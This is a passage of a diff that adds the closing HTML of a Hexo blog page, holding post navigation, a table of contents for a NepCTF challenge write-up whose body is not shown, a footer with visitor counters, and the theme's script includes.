+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/07/25/%E6%B8%B8%E8%AE%B0%C2%B7%E4%B8%9C%E4%BA%AC/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">游记·东京</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">目录</div>
+        <div class="page-title">NepCTF个人WP与赛后总结</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nepsign"><span class="nav-text">Nepsign</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NepBotEvent"><span class="nav-text">NepBotEvent</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SpeedMino"><span class="nav-text">SpeedMino</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A2%E6%9C%8D%E5%B0%8F%E7%BE%8E"><span class="nav-text">客服小美</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MoewBle%E5%96%B5%E6%B3%A1"><span class="nav-text">MoewBle喵泡</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Time"><span class="nav-text">Time</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easyGooGooVVVY"><span class="nav-text">easyGooGooVVVY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RevengeGooGooVVVY"><span class="nav-text">RevengeGooGooVVVY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaSeri"><span class="nav-text">JavaSeri</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93"><span class="nav-text">个人总结</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Wang1r</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 31 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+</body>
+</html>
